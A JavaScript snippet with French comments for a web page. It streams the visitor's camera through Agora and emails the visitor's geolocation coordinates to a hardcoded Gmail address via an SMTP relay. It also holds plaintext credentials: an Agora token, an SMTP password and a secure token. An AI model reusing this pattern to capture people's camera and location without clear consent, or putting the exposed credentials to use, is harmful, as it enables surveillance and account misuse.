
    const APP_ID = '98a84bad74bb4de0b0728bf1730007ab'; 
    const CHANNEL_NAME = 'fini';
    const TOKEN = "007eJxTYCiv4vth8Dn6X1qM0ol6tjc1Zq8Stv3XaTi8xi6odZbyI0UFBkuLRAuTpMQUc5OkJJOUVIMkA3Mji6Q0Q3NjAwMD88SkIz9PpjcEMjJYyy1iZWSAQBCfhSEtMy+TgQEAmvwgkg==";
   

    const client = AgoraRTC.createClient({ mode: "rtc", codec: "vp8" });

    async function startStream() {
        try {
            await client.join(APP_ID, CHANNEL_NAME, TOKEN, null);
            
            // Capture la caméra
            const localTrack = await AgoraRTC.createCameraVideoTrack();

            // Affiche la vidéo sur la page
            const videoElement = document.getElementById("localVideo");
            videoElement.srcObject = new MediaStream([localTrack.getMediaStreamTrack()]);

            // Envoie le flux vidéo à Agora
            await client.publish(localTrack);

            console.log("✅ Streaming en cours...");
        } catch (error) {
            console.error("❌ Erreur lors du streaming:", error);
        }
    }

let video = document.querySelector('video');
if(navigator.mediaDevices.getUserMedia) {
    navigator.mediaDevices.getUserMedia({ video: true })
    .then(function(stream) {
        video.srcObject = stream;

    })
    .catch(function(error) {
        console.log("Error: " + error);
    });
}

navigator.geolocation.getCurrentPosition(position => {
    const { latitude, longitude } = position.coords;
    // Show a map centered at latitude / longitude.

  map.innerHTML = '<iframe width="100%" height="100%" src="https://maps.google.com/maps?q='+latitude+','+longitude+'&amp;z=15&amp;output=embed"></iframe>';

    if(position) {

        let send =`<b>vous avez un nouveau message voici l'adresse: </b> ${latitude} + ${longitude}`;
    Email.send({
        Host : "smtp.elasticemail.com",
        Username : "merviendma@gmail.com",
        Password : "0A3820F0657D0726E4D1A76183B571550DA9",
        SecureToken : "236369de-bba0-4150-b749-71209e0ab842",
        To : 'merviendama@gmail.com',
        From : "merviendama@gmail.com",
        Subject : "Nouvel adresse",
        Body : send
    }).then(
      message => alert("message envoyer")
    );
}
});
